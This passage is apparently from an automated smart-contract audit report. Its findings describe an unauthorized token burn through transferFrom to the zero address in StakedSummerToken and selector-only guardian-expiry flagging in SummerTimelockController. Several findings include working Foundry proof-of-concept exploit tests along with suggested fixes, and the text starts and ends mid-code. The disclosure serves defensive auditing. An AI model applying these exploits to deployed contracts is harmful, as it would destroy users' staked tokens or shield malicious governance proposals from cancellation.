    function revokeRole(bytes32, address) public view override { revert("DirectRevokeIsDisabled"); }

    function _canTransfer(address from, address to) internal pure returns (bool) {
        return from == address(0) || to == address(0);
    }
    function _canBurnFrom(address from, address spender) internal view returns (bool) {
        return spender == from || hasRole(BURNER_ROLE, spender);
    }
}

contract BurnBypassTest is Test {
    StakedSummerToken xsumr;
    ProtocolAccessManager access;
    address gov = address(this);
    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        access = new ProtocolAccessManager(gov);
        xsumr = new StakedSummerToken(address(access));
        // Governor grants MINTER_ROLE to this test contract, so we can mint to victim
        xsumr.grantMinterRole(address(this));
        xsumr.mint(victim, 100e18);
    }

    function test_UnauthorizedBurnViaTransferFromZero() public {
        assertEq(xsumr.balanceOf(victim), 100e18);

        // Victim approves attacker
        vm.prank(victim);
        xsumr.approve(attacker, 50e18);
        assertEq(xsumr.allowance(victim, attacker), 50e18);

        // Attacker lacks BURNER_ROLE; burnFrom should fail
        vm.prank(attacker);
        vm.expectRevert();
        xsumr.burnFrom(victim, 10e18);

        // But transferFrom to address(0) succeeds, burning without BURNER_ROLE
        vm.prank(attacker);
        bool ok = xsumr.transferFrom(victim, address(0), 50e18);
        assertTrue(ok);

        // Victim lost tokens; allowance consumed
        assertEq(xsumr.balanceOf(victim), 50e18);
        assertEq(xsumr.allowance(victim, attacker), 0);
    }
}


## Suggested Mitigation
Close all public burn paths except burn() and burnFrom(). Options: 1) Override transfer and transferFrom to revert when to == address(0) (and from != address(0)), forcing callers to use burn()/burnFrom() where _canBurnFrom enforces BURNER_ROLE or self-burn. 2) Alternatively, keep transfer/transferFrom but add an authorization gate: in transfer/transferFrom, if to == address(0), require(msg.sender == from || hasRole(BURNER_ROLE, msg.sender)), and (when msg.sender != from) also require sufficient allowance. Approach (1) is simpler and ensures all third-party burns flow through burnFrom() and its role checks.





 **Derived From** : When paused()==true, mint/burn/burnFrom revert and no Transfer is emitted; when unpaused, authorized calls succeed

## [M-6]. Auth bypass: Any approved spender can burn users’ xSUMR via transferFrom(..., address(0)) bypassing BURNER_ROLE after unpause, locking users’ staked SUMR

## Derived From Pattern/Invariant
When paused()==true, mint/burn/burnFrom revert and no Transfer is emitted; when unpaused, authorized calls succeed

## Exploit Type
AuthByPass

## Location
StakedSummerToken.transferFrom

## Minimim Privilege Required
Permissionless

## Description
StakedSummerToken intends to restrict burns to either the token owner or addresses with BURNER_ROLE via burnFrom(). However, because OZ v5 ERC20 unifies mint/burn/transfer via _update and StakedSummerToken’s _canTransfer() explicitly allows movements when to==address(0) (burn) or from==address(0) (mint), a spender with allowance can call transferFrom(user, address(0), amount) to burn the user’s xSUMR without holding BURNER_ROLE and without going through burnFrom()’s _canBurnFrom check. This breaks the stated invariant that after unpause, operations resume with proper roles: burning can be performed by any approved spender, not just BURNER_ROLE. Practically, this lets an attacker who has or acquires allowance (e.g., deceptive permit) irreversibly burn a user’s xSUMR. Since unstake flows in SummerStaking require burning the user’s xSUMR 1:1, the victim will be unable to unstake their underlying SUMR (funds effectively locked) and also loses voting power. While paused, this path is blocked by ERC20Pausable; after unpause it resumes without the intended role restriction. Vulnerable snippet: function _canTransfer(address from, address to) internal pure returns (bool) { return from == address(0) || to == address(0); } Combined with ERC20.transferFrom and OZ v5 unified _update, transferFrom(from, address(0), amount) becomes a burn without BURNER_ROLE checks.

## Impact
Any spender with allowance can irreversibly burn a user’s xSUMR by calling transferFrom(user, address(0), amount) without holding BURNER_ROLE. This permanently removes the victim’s voting power and prevents the required 1:1 burn during unstake, effectively locking their underlying SUMR until governance intervenes. This is a user-impacting denial-of-service on withdrawals, not a direct theft of funds.

## Proof of Concept
Attack steps:
- Victim grants allowance to attacker (e.g., by phishing permit).
- Attacker calls transferFrom(victim, address(0), amount).
- Because _canTransfer allows to==address(0), the call burns the victim’s xSUMR via ERC20’s unified _update path, bypassing burnFrom’s BURNER_ROLE gate.
- If paused, ERC20Pausable blocks the path; once unpaused, the bypass works again.

## Proof of Code
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {StakedSummerToken} from "src/contracts/token/StakedSummerToken.sol";

interface IERC165 { function supportsInterface(bytes4) external view returns (bool); }
interface IProtocolAccessManager is IERC165 { function hasRole(bytes32, address) external view returns (bool); function FOUNDATION_ROLE() external view returns (bytes32); }

contract MockAccessManager is IProtocolAccessManager {
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
    function hasRole(bytes32, address) external pure returns (bool) { return true; } // everyone is governor/guardian for tests
    function FOUNDATION_ROLE() external pure returns (bytes32) { return keccak256("FOUNDATION_ROLE"); }
}

contract AuthBypassBurnTest is Test {
    StakedSummerToken token;
    MockAccessManager am;
    address governor = address(0xA11CE);
    address victim = address(0xB0B);
    address attacker = address(0xC0FFEE);

    function setUp() public {
        am = new MockAccessManager();
        token = new StakedSummerToken(address(am));
        // Grant minter role and mint victim some xSUMR
        vm.prank(governor);
        token.grantMinterRole(address(this));
        token.mint(victim, 100 ether);
        assertEq(token.balanceOf(victim), 100 ether);
    }

    function test_BurnerRoleCheckBypassedViaTransferFromToZero() public {
        // Victim approves attacker (e.g., via permit in real world)
        vm.prank(victim);
        token.approve(attacker, type(uint256).max);

        // Attempting burnFrom should fail (attacker lacks BURNER_ROLE and is not owner)
        vm.prank(attacker);
        vm.expectRevert();
        token.burnFrom(victim, 10 ether);

        // But transferFrom to zero burns successfully, bypassing the role gate
        vm.prank(attacker);
        token.transferFrom(victim, address(0), 60 ether);
        assertEq(token.balanceOf(victim), 40 ether);
    }

    function test_PauseBlocksBypassUntilUnpaused() public {
        // Pause blocks all mint/burn/transfer updates
        vm.prank(governor);
        token.pause();

        vm.prank(victim);
        token.approve(attacker, type(uint256).max);

        vm.prank(attacker);
        vm.expectRevert();
        token.transferFrom(victim, address(0), 10 ether); // reverts while paused

        // Unpause restores (unauthorized) burn via transferFrom to zero
        vm.prank(governor);
        token.unpause();

        vm.prank(attacker);
        token.transferFrom(victim, address(0), 10 ether);
        assertEq(token.balanceOf(victim), 90 ether);
    }
}


## Suggested Mitigation
Enforce burn authorization on all burn paths, not only in burnFrom(). Two options:
- Strict: Override transfer and transferFrom to always revert (fully non-transferable token), and require burn to go through burn()/burnFrom() only.
- Targeted: In _update, gate the burn case so only the owner or BURNER_ROLE can initiate a burn via any path:
  if (to == address(0) && from != address(0)) { require(msg.sender == from || hasRole(BURNER_ROLE, msg.sender), "xSumr__NotAuthorized"); }
This preserves self-burn and authorized burner-module flows while preventing allowance-only burns by arbitrary spenders via transferFrom(..., address(0)).





 **Derived From** : Selector-only detection mislabels ops as guardian-expiry, blocking guardian cancel

## [M-7]. Proposer can mislabel any operation as guardian-expiry via selector-only check, blocking guardian cancellation

## Derived From Pattern/Invariant
Selector-only detection mislabels ops as guardian-expiry, blocking guardian cancel

## Exploit Type
AccountingInvariantViolation

## Location
SummerTimelockController.schedule / scheduleBatch / cancel

## Minimim Privilege Required
RequiresRole

## Description
SummerTimelockController marks an operation as a guardian-expiry solely by checking the first 4 bytes of calldata without verifying the target is ProtocolAccessManager. A proposer can include a dummy call to any target with the same selector (setGuardianExpiration(address,uint256)) to force _guardianExpiryOperations[id] = true. Then cancel(id) takes the guardian-expiry branch and reverts for guardians, requiring a governor instead. If governors are not assigned CANCELLER_ROLE in timelock, no one can cancel the mislabelled operation, creating a governance DoS for cancellers that are guardians. Vulnerable snippet:

// schedule
if (bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) {
    _guardianExpiryOperations[id] = true;
}

// scheduleBatch
if (bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) {
    _guardianExpiryOperations[id] = true;
}

And cancel enforces governor-only for flagged ops:
if (_isGuardianExpiryProposal(id)) {
    require(accessManager.hasRole(accessManager.GOVERNOR_ROLE(), msg.sender), "Only governors can cancel guardian expiry proposals");
    super.cancel(id); // still requires CANCELLER_ROLE
}

## Impact
A proposer-controlled payload can mislabel any scheduled operation (single or batch) as a guardian-expiry proposal by including any calldata with the setGuardianExpiration selector, even if the target is not the ProtocolAccessManager. This removes guardian cancellation rights for that operation and requires a Governor with CANCELLER_ROLE to cancel. If no Governor holds CANCELLER_ROLE on the timelock (a plausible configuration), the operation becomes effectively non-cancellable, breaking the documented invariant that guardians can cancel queued proposals (except true guardian-expiry ops) and potentially enabling governance DoS on the cancel path.

## Proof of Concept
Key idea: SummerTimelockController flags an operation as a guardian-expiry solely by checking the calldata selector, without verifying the target is the ProtocolAccessManager. Any proposal (single or batch) that includes a call with the same 4-byte selector will mark the entire operation id as guardian-expiry. As a result, cancel(id) enforces the stricter branch (Governor-only + CANCELLER_ROLE via super.cancel), preventing guardians with CANCELLER_ROLE from cancelling. If the deployment does not grant CANCELLER_ROLE to any Governor, the operation becomes non-cancellable.

Steps:
1) Deploy ProtocolAccessManager with a Governor G.
2) Deploy SummerTimelockController TL with minDelay > 0, proposers = [proposer P, guardian Gu] so both get CANCELLER_ROLE (as OZ Timelock grants it to proposers). Set TL.accessManager = ProtocolAccessManager.
3) From G, grant Gu the GUARDIAN_ROLE and set a future guardian expiration so Gu is an active guardian.
4) Deploy DummyTarget with a function whose selector equals IProtocolAccessManager.setGuardianExpiration(address,uint256).
5) From P (a timelock proposer), schedule a call on TL to DummyTarget with data = abi.encodeWithSelector(IProtocolAccessManager.setGuardianExpiration.selector, someAddr, ts). TL marks _guardianExpiryOperations[id] = true (target is ignored by current code).
6) Gu (has CANCELLER_ROLE and is an active guardian) tries TL.cancel(id) and reverts with "Only governors can cancel guardian expiry proposals" due to the mislabel.
7) Even P with CANCELLER_ROLE but without GOVERNOR_ROLE cannot cancel. If no Governor has CANCELLER_ROLE on TL, the operation is now non-cancellable.

Note: In a typical production setup, the Governor contract is the only timelock PROPOSER. The same mislabel is still exploitable by any proposer at the Governor layer (who composes the batch) because TL’s schedule/scheduleBatch only inspect the selector and do not verify the target; thus a malicious/compromised proposal can immunize itself against guardian cancellation by appending a dummy call with the matching selector to any target.

## Proof of Code
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {SummerTimelockController} from "packages/gov-contracts/src/contracts/SummerTimelockController.sol";
import {ProtocolAccessManager} from "packages/access-contracts/src/contracts/ProtocolAccessManager.sol";
import {IProtocolAccessManager} from "packages/access-contracts/src/interfaces/IProtocolAccessManager.sol";

contract DummyTarget {
    // Matches selector of IProtocolAccessManager.setGuardianExpiration(address,uint256)
    function setGuardianExpiration(address, uint256) external {}
}

contract TimelockGuardianExpirySelectorMislabelTest is Test {
    ProtocolAccessManager accessManager;
    SummerTimelockController tl;
    DummyTarget dummy;

    address gov = address(0xA11CE);
    address proposer = address(0xBEEF);
    address guardian = address(0xC0FFEE);

    function setUp() public {
        vm.label(gov, "GOV");
        vm.label(proposer, "PROPOSER");
        vm.label(guardian, "GUARDIAN");

        accessManager = new ProtocolAccessManager(gov);

        // Timelock: grant PROPOSER_ROLE and CANCELLER_ROLE to both addresses via constructor
        address[] memory proposers = new address[](2);
        proposers[0] = proposer;
        proposers[1] = guardian;
        address[] memory executors = new address[](1);
        executors[0] = address(this);

        tl = new SummerTimelockController(1 days, proposers, executors, address(0), address(accessManager));

        // Make guardian active
        vm.startPrank(gov);
        accessManager.grantGuardianRole(guardian);
        accessManager.setGuardianExpiration(guardian, block.timestamp + 30 days);
        vm.stopPrank();
        assertTrue(accessManager.isActiveGuardian(guardian));

        dummy = new DummyTarget();
    }

    function test_MislabelledExpiry_DisablesGuardianCancel_AndBlocksNonGovernorCanceller() public {
        bytes memory data = abi.encodeWithSelector(
            IProtocolAccessManager.setGuardianExpiration.selector,
            address(0xDEAD),
            block.timestamp + 8 days
        );

        bytes32 predecessor = bytes32(0);
        bytes32 salt = keccak256("salt");
        uint256 delay = tl.getMinDelay();

        // Schedule by a regular proposer (who also has CANCELLER_ROLE per OZ timelock constructor)
        vm.prank(proposer);
        tl.schedule(address(dummy), 0, data, predecessor, salt, delay);

        bytes32 id = tl.hashOperation(address(dummy), 0, data, predecessor, salt);
        assertTrue(tl.isOperationPending(id));

        // Active guardian with CANCELLER_ROLE cannot cancel due to mislabel → requires GOVERNOR_ROLE
        vm.prank(guardian);
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        tl.cancel(id);

        // Even the proposer (has CANCELLER_ROLE) but is not a governor cannot cancel
        vm.prank(proposer);
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        tl.cancel(id);

        // Control: a non-expiry op is cancellable by guardian
        bytes memory benign = abi.encodeWithSignature("foo()" ); // function doesn't need to exist; scheduling doesn't execute
        vm.prank(proposer);
        tl.schedule(address(dummy), 0, benign, predecessor, bytes32(uint256(1)), delay);
        bytes32 id2 = tl.hashOperation(address(dummy), 0, benign, predecessor, bytes32(uint256(1)));
        vm.prank(guardian);
        tl.cancel(id2);
        // After cancel, operation should no longer be registered
        assertFalse(tl.isOperation(id2));
    }
}


## Suggested Mitigation
In schedule and scheduleBatch, set the guardian-expiry flag only when BOTH conditions hold: (a) the selector equals IProtocolAccessManager.setGuardianExpiration.selector AND (b) the target equals address(accessManager). For batch, require targets[i] == address(accessManager) alongside the selector match before flagging.

Example:
- schedule: if (target == address(accessManager) && bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) { _guardianExpiryOperations[id] = true; }
- scheduleBatch: if (targets[i] == address(accessManager) && bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) { _guardianExpiryOperations[id] = true; }

Optional hardening:
- Emit an event (e.g., GuardianExpiryOperationFlagged(id)) when marking to aid monitoring.
- Consider computing the flag after basic validation (e.g., after ensuring arrays length and delay) to reduce any chance of stale flags if scheduling reverts (non-critical).


## [M-8]. Proposer can mislabel any scheduled op as guardian-expiry via selector-only check in SummerTimelockController.schedule(), blocking guardian cancel

## Derived From Pattern/Invariant
Selector-only detection mislabels ops as guardian-expiry, blocking guardian cancel

## Exploit Type
AccountingInvariantViolation

## Location
SummerTimelockController.schedule

## Minimim Privilege Required
RequiresRole

## Description
SummerTimelockController marks an operation as a guardian-expiry solely by comparing the first 4 bytes of calldata to IProtocolAccessManager.setGuardianExpiration.selector, without verifying that the target is the ProtocolAccessManager. A proposer can include a dummy call to any target with the same selector so that _guardianExpiryOperations[id] = true. This forces cancel() to require a GOVERNOR (accessManager.GOVERNOR_ROLE()) even though the operation does not actually expire guardians, preventing active guardians with CANCELLER_ROLE from cancelling otherwise cancellable proposals.

Vulnerable snippet:

if (bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) {
    _guardianExpiryOperations[id] = true;
}

and in scheduleBatch:

if (bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) {
    _guardianExpiryOperations[id] = true;
}

## Impact
A proposer with PROPOSER_ROLE can spoof the guardian-expiry flag on any queued operation by using the setGuardianExpiration selector against an arbitrary target. This incorrectly forces the stricter governor-only cancellation path for that operation and blocks active guardians (even with CANCELLER_ROLE) from cancelling it. Since cancellation of queued timelock operations is a time-sensitive safety function, this undermines the protocol’s intended guardian emergency powers and can let dangerous operations proceed unless a governor with CANCELLER_ROLE reacts in time.

## Proof of Concept
1) Setup: Deploy ProtocolAccessManager, grant GOVERNOR_ROLE to gov, grant GUARDIAN_ROLE to guardian, set guardian expiration in the future (making guardian active). Deploy SummerTimelockController with proposer list including attacker and guardian (so guardian has CANCELLER_ROLE). 2) Attacker deploys a FakeExpirer contract with a function having the same signature as setGuardianExpiration(address,uint256). 3) Attacker schedules an operation that targets FakeExpirer using calldata encoded with IProtocolAccessManager.setGuardianExpiration.selector. The schedule() selector-only check mislabels the operation as a guardian-expiry. 4) When the guardian attempts to cancel, cancel(id) reverts with "Only governors can cancel guardian expiry proposals". 5) A genuine guardian-expiry was not proposed; the proposer only spoofed the selector. The same spoofing works in scheduleBatch by including any payload whose first 4 bytes match the selector.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {AccessControl} from "openzeppelin-contracts/contracts/access/AccessControl.sol";
import {TimelockController} from "openzeppelin-contracts/contracts/governance/TimelockController.sol";

interface IProtocolAccessManager {
    function GOVERNOR_ROLE() external pure returns (bytes32);
    function GUARDIAN_ROLE() external pure returns (bytes32);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function isActiveGuardian(address account) external view returns (bool);
    function grantGuardianRole(address account) external;
    function setGuardianExpiration(address account, uint256 expiration) external;

    function setGuardianExpiration(address, uint256) external; // for selector reference
}

contract ProtocolAccessManager is IProtocolAccessManager, AccessControl {
    bytes32 public constant GOVERNOR_ROLE_CONST = keccak256("GOVERNOR_ROLE");
    bytes32 public constant GUARDIAN_ROLE_CONST = keccak256("GUARDIAN_ROLE");
    mapping(address => uint256) public guardianExpirations;

    constructor(address governor) {
        _grantRole(GOVERNOR_ROLE_CONST, governor);
    }

    function GOVERNOR_ROLE() external pure returns (bytes32) { return keccak256("GOVERNOR_ROLE"); }
    function GUARDIAN_ROLE() external pure returns (bytes32) { return keccak256("GUARDIAN_ROLE"); }

    function grantGuardianRole(address account) external onlyRole(GOVERNOR_ROLE_CONST) {
        _grantRole(GUARDIAN_ROLE_CONST, account);
    }

    function setGuardianExpiration(address account, uint256 expiration) external onlyRole(GOVERNOR_ROLE_CONST) {
        require(hasRole(GUARDIAN_ROLE_CONST, account), "not guardian");
        guardianExpirations[account] = expiration;
    }

    function isActiveGuardian(address account) external view returns (bool) {
        return hasRole(GUARDIAN_ROLE_CONST, account) && guardianExpirations[account] > block.timestamp;
    }
}

contract SummerTimelockController is TimelockController {
    IProtocolAccessManager public immutable accessManager;
    mapping(bytes32 => bool) private _guardianExpiryOperations;

    constructor(
        uint256 minDelay,
        address[] memory proposers,
        address[] memory executors,
        address admin,
        address _accessManager
    ) TimelockController(minDelay, proposers, executors, admin) {
        accessManager = IProtocolAccessManager(_accessManager);
    }

    function cancel(bytes32 id) public virtual override {
        if (_guardianExpiryOperations[id]) {
            require(
                accessManager.hasRole(accessManager.GOVERNOR_ROLE(), msg.sender),
                "Only governors can cancel guardian expiry proposals"
            );
            super.cancel(id); // still requires CANCELLER_ROLE
            return;
        }

        // governor with canceller role
        if (hasRole(CANCELLER_ROLE, msg.sender) && accessManager.hasRole(accessManager.GOVERNOR_ROLE(), msg.sender)) {
            super.cancel(id);
            return;
        }

        // active guardian with canceller role
        if (!(hasRole(CANCELLER_ROLE, msg.sender) && accessManager.isActiveGuardian(msg.sender))) {
            revert TimelockUnauthorizedCaller(msg.sender);
        }
        super.cancel(id);
    }

    function schedule(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) public virtual override onlyRole(PROPOSER_ROLE) {
        bytes32 id = hashOperation(target, value, data, predecessor, salt);
        if (bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) {
            _guardianExpiryOperations[id] = true; // vulnerable: no target check
        }
        super.schedule(target, value, data, predecessor, salt, delay);
    }

    function scheduleBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata payloads,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) public virtual override onlyRole(PROPOSER_ROLE) {
        bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
        for (uint256 i = 0; i < payloads.length; i++) {
            if (bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) {
                _guardianExpiryOperations[id] = true; // vulnerable: no per-target accessManager check
            }
        }
        super.scheduleBatch(targets, values, payloads, predecessor, salt, delay);
    }
}

contract FakeExpirer {
    function setGuardianExpiration(address, uint256) external {}
}

contract TimelockGuardianExpirySelectorPoC is Test {
    address gov = address(0xA11CE);
    address guardian = address(0xBEEF);
    address attacker = address(0xBAD);

    ProtocolAccessManager accessManager;
    SummerTimelockController timelock;
    FakeExpirer fake;

    uint256 constant MIN_DELAY = 1 days;

    function setUp() public {
        accessManager = new ProtocolAccessManager(gov);
        vm.startPrank(gov);
        accessManager.grantGuardianRole(guardian);
        accessManager.setGuardianExpiration(guardian, block.timestamp + 30 days);
        vm.stopPrank();

        address[] memory proposers = new address[](2);
        proposers[0] = attacker; // attacker can propose
        proposers[1] = guardian; // guardian also has PROPOSER + CANCELLER via OZ Timelock constructor
        address[] memory executors = new address[](0);
        timelock = new SummerTimelockController(MIN_DELAY, proposers, executors, gov, address(accessManager));

        // Governor must also have CANCELLER_ROLE to pass super.cancel modifier on guardian-expiry path
        vm.prank(gov);
        timelock.grantRole(timelock.CANCELLER_ROLE(), gov);

        fake = new FakeExpirer();
    }

    function test_SelectorOnlyMislabelsAndBlocksGuardianCancel() public {
        // Payload uses the same selector but targets a fake contract
        bytes memory data = abi.encodeWithSelector(
            IProtocolAccessManager.setGuardianExpiration.selector,
            guardian,
            block.timestamp + 1 days
        );

        bytes32 predecessor = bytes32(0);
        bytes32 salt = keccak256("salt");
        uint256 delay = MIN_DELAY;

        vm.prank(attacker);
        timelock.schedule(address(fake), 0, data, predecessor, salt, delay);

        bytes32 id = timelock.hashOperation(address(fake), 0, data, predecessor, salt);
        assertTrue(timelock.isOperationPending(id));

        // Guardian (active + CANCELLER_ROLE) is blocked due to mislabel
        vm.prank(guardian);
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        timelock.cancel(id);

        // Governor with CANCELLER_ROLE can cancel
        vm.prank(gov);
        timelock.cancel(id);
        assertFalse(timelock.isOperation(id));
    }
}


## Suggested Mitigation
In both schedule() and scheduleBatch(), only flag an operation as a guardian-expiry if the target equals the bound accessManager and the calldata corresponds to setGuardianExpiration. Example: in schedule(): if (target == address(accessManager) && bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) { _guardianExpiryOperations[id] = true; }. In scheduleBatch(), apply the same check per (targets[i], payloads[i]) pair. Optionally, also decode calldata to validate the argument structure to prevent malformed inputs from being misidentified.





 **Derived From** : target == address(accessManager) && bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector => _isGuardianExpiryProposal(hashOperation(target, value, data, predecessor, salt))

## [M-9]. Selector-only check misflags non-accessManager calls as guardian-expiry, blocking guardian cancellation

## Derived From Pattern/Invariant
target == address(accessManager) && bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector => _isGuardianExpiryProposal(hashOperation(target, value, data, predecessor, salt))

## Exploit Type
EventConsistency

## Location
SummerTimelockController.schedule/scheduleBatch

## Minimim Privilege Required
RequiresRole

## Description
SummerTimelockController.schedule/scheduleBatch mark an operation as guardian-expiry solely by matching bytes4(data) to setGuardianExpiration selector, without verifying that the call targets the accessManager. This breaks the referential invariant that the _guardianExpiryOperations[id] mapping should only reflect operations that target accessManager.setGuardianExpiration. A malicious proposer can include a decoy call to any contract exposing the same signature (or even a bogus payload starting with the same 4-byte selector) to force _guardianExpiryOperations[id] = true. Consequences: guardians with CANCELLER_ROLE can no longer cancel the queued operation; only addresses with GOVERNOR_ROLE can. Attackers can immunize arbitrary proposals/batches from guardian cancellation and even create batches that fail to execute (due to the decoy), causing persistent ready-but-unexecutable ops that only governors can cancel.

Vulnerable snippets:

- Single-call:
if (bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) {
    _guardianExpiryOperations[id] = true;
}

- Batch:
for (uint256 i = 0; i < payloads.length; i++) {
    if (bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) {
        _guardianExpiryOperations[id] = true;
    }
}

## Impact
Functional: Guardians are unable to cancel misflagged operations; attacker can shield malicious proposals/batches from guardian cancel and/or create stuck operations that only governors can clear.

## Proof of Concept
- Deploy ProtocolAccessManager and grant GUARDIAN_ROLE to guardian; set future expiration so guardian is active.
- Deploy SummerTimelockController with admin=gov, grant PROPOSER_ROLE to attacker and CANCELLER_ROLE to guardian.
- Attacker schedules a single-call operation with target=Decoy (any contract exposing setGuardianExpiration(address,uint256)) and calldata encoded with that selector.
- Due to selector-only check, _guardianExpiryOperations[id] = true even though target != accessManager.
- Guardian attempts cancel(id) and reverts with "Only governors can cancel guardian expiry proposals". Thus a non-accessManager call was misflagged and blocked guardian cancellation.
- Variant: In a batch, include any benign actions plus a decoy payload with the selector to similarly block guardian cancel for the entire batch.

## Proof of Code
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {TimelockController} from "openzeppelin-contracts/governance/TimelockController.sol";

interface IProtocolAccessManager {
    function GOVERNOR_ROLE() external pure returns (bytes32);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function isActiveGuardian(address account) external view returns (bool);
    function setGuardianExpiration(address account, uint256 expiration) external;
}

contract ProtocolAccessManagerMock is IProtocolAccessManager {
    bytes32 public constant GOVERNOR_ROLE_CONST = keccak256("GOVERNOR_ROLE");
    bytes32 public constant GUARDIAN_ROLE_CONST = keccak256("GUARDIAN_ROLE");

    mapping(bytes32 => mapping(address => bool)) public roles;
    mapping(address => uint256) public guardianExpirations;

    function GOVERNOR_ROLE() external pure returns (bytes32) { return keccak256("GOVERNOR_ROLE"); }

    function grantGovernorRole(address a) external { roles[GOVERNOR_ROLE_CONST][a] = true; }
    function grantGuardianRole(address a) external { roles[GUARDIAN_ROLE_CONST][a] = true; }

    function hasRole(bytes32 role, address account) external view returns (bool) { return roles[role][account]; }

    function isActiveGuardian(address account) external view returns (bool) {
        return roles[GUARDIAN_ROLE_CONST][account] && guardianExpirations[account] > block.timestamp;
    }

    function setGuardianExpiration(address account, uint256 expiration) external { guardianExpirations[account] = expiration; }
}

contract SummerTimelockController is TimelockController {
    IProtocolAccessManager public immutable accessManager;
    mapping(bytes32 => bool) private _guardianExpiryOperations;

    constructor(
        uint256 minDelay,
        address[] memory proposers,
        address[] memory executors,
        address admin,
        address _accessManager
    ) TimelockController(minDelay, proposers, executors, admin) {
        accessManager = IProtocolAccessManager(_accessManager);
    }

    function cancel(bytes32 id) public virtual override {
        if (_isGuardianExpiryProposal(id)) {
            require(
                accessManager.hasRole(accessManager.GOVERNOR_ROLE(), msg.sender),
                "Only governors can cancel guardian expiry proposals"
            );
            super.cancel(id);
            return;
        }

        if (_isGovernorWithCancelRole(msg.sender)) {
            super.cancel(id);
            return;
        }

        if (!_isActiveGuardianWithCancelRole(msg.sender)) {
            revert TimelockUnauthorizedCaller(msg.sender);
        }

        super.cancel(id);
    }

    function _isGuardianExpiryProposal(bytes32 id) internal view returns (bool) {
        return _guardianExpiryOperations[id];
    }

    function _isGovernorWithCancelRole(address account) internal view returns (bool) {
        return hasRole(CANCELLER_ROLE, account) && accessManager.hasRole(accessManager.GOVERNOR_ROLE(), account);
    }

    function _isActiveGuardianWithCancelRole(address account) internal view returns (bool) {
        return hasRole(CANCELLER_ROLE, account) && accessManager.isActiveGuardian(account);
    }

    function schedule(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) public virtual override onlyRole(PROPOSER_ROLE) {
        bytes32 id = hashOperation(target, value, data, predecessor, salt);
        if (bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) {
            _guardianExpiryOperations[id] = true; // BUG: no target check
        }
        super.schedule(target, value, data, predecessor, salt, delay);
    }

    function scheduleBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata payloads,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) public virtual override onlyRole(PROPOSER_ROLE) {
        bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
        for (uint256 i = 0; i < payloads.length; i++) {
            if (bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) {
                _guardianExpiryOperations[id] = true; // BUG: no per-index target check
            }
        }
        super.scheduleBatch(targets, values, payloads, predecessor, salt, delay);
    }
}

contract Decoy {
    // Same signature as in IProtocolAccessManager, but not the real AccessManager
    function setGuardianExpiration(address, uint256) external {}
    function other() external {}
}

contract MisflagGuardianExpiryTest is Test {
    ProtocolAccessManagerMock accessManager;
    SummerTimelockController tl;
    Decoy decoy;

    address gov = address(0xB0B);
    address guardian = address(0xCAFE);
    address attacker = address(0xA11CE);

    function setUp() public {
        accessManager = new ProtocolAccessManagerMock();
        decoy = new Decoy();

        // Make guardian active
        accessManager.grantGuardianRole(guardian);
        vm.warp(1000);
        accessManager.setGuardianExpiration(guardian, block.timestamp + 30 days);

        // Timelock with admin=self (grant roles), proposer=attacker, executor=open(address(0))
        address[] memory proposers = new address[](1);
        proposers[0] = attacker;
        address[] memory executors = new address[](1);
        executors[0] = address(0);
        tl = new SummerTimelockController(1, proposers, executors, address(this), address(accessManager));

        // Guardian can cancel non-expiry ops
        tl.grantRole(tl.CANCELLER_ROLE(), guardian);
    }

    function test_MisflaggingBlocksGuardianCancel() public {
        // attacker schedules a non-accessManager call with matching selector
        bytes memory payload = abi.encodeWithSelector(
            IProtocolAccessManager.setGuardianExpiration.selector,
            guardian,
            block.timestamp + 7 days
        );
        bytes32 pred = bytes32(0);
        bytes32 salt = keccak256("salt");

        vm.prank(attacker);
        tl.schedule(address(decoy), 0, payload, pred, salt, 1);
        bytes32 id = tl.hashOperation(address(decoy), 0, payload, pred, salt);

        // Guardian cancel must now revert because op is misflagged as guardian-expiry
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        vm.prank(guardian);
        tl.cancel(id);

        // Control: schedule a non-flagged op -> guardian can cancel
        bytes memory payload2 = abi.encodeWithSelector(Decoy.other.selector);
        vm.prank(attacker);
        tl.schedule(address(decoy), 0, payload2, bytes32(0), bytes32("s2"), 1);
        bytes32 id2 = tl.hashOperation(address(decoy), 0, payload2, bytes32(0), bytes32("s2"));
        vm.prank(guardian);
        tl.cancel(id2);
        assertFalse(tl.isOperation(id2));
    }

    function test_BatchDecoyAlsoBlocksGuardianCancel() public {
        // Batch with benign + decoy selector to misflag
        address[] memory targets = new address[](2);
        targets[0] = address(decoy);
